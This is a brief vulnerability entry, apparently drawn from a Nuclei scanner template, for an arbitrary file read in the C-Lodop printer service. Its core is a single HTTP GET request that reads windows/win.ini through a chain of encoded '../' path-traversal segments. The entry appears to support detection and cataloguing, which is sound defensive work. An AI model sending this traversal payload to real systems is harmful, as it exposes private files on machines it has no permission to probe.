# Vulnerability: C-Lodop Printer - Arbitrary File Read
**Classification:** CWE-23
**Source:** Nuclei Template (`clodop-printer-lfi.yaml`)

## Description
The C-Lodop printer has an arbitrary file reading vulnerability. By constructing a special URL, it can read any file in the system.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
```

